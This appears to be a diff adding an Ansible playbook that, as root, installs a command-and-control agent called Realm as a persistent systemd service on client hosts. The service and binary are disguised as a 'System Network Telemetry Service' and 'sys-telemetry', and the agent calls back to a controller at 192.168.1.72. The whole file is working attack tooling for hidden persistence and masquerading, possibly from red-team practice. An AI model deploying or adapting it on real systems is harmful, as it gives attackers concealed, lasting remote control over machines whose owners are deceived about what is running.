@@ -1,0 +1,49 @@
+---
+- name: Persist Realm agent as systemd service
+  hosts: clients
+  become: yes
+
+  vars:
+    realm_service_name: net-log-manager
+    realm_unit_path: /etc/systemd/system/net-log-manager.service
+    realm_binary_path: /usr/local/bin/sys-telemetry
+    realm_callback_uri: "http://192.168.1.72"
+    realm_server_pubkey: "<YOUR_PUBKEY>"
+
+  tasks:
+    - name: Verify Realm agent binary exists
+      ansible.builtin.stat:
+        path: "{{ realm_binary_path }}"
+      register: realm_bin
+
+    - name: Fail if Realm agent binary is missing
+      ansible.builtin.fail:
+        msg: "Expected Realm agent binary at {{ realm_binary_path }} but it does not exist."
+      when: not realm_bin.stat.exists
+
+    - name: Install Realm systemd unit
+      ansible.builtin.copy:
+        dest: "{{ realm_unit_path }}"
+        owner: root
+        group: root
+        mode: "0644"
+        content: |
+          [Unit]
+          Description=System Network Telemetry Service
+          After=network.target
+
+          [Service]
+          Type=simple
+          ExecStart={{ realm_binary_path }} --callback-uri {{ realm_callback_uri }} --server-pubkey {{ realm_server_pubkey }}
+          Restart=always
+          RestartSec=10
+
+          [Install]
+          WantedBy=multi-user.target
+
+    - name: Enable and start Realm service
+      ansible.builtin.systemd:
+        name: "{{ realm_service_name }}"
+        enabled: yes
+        state: started
+        daemon_reload: yes
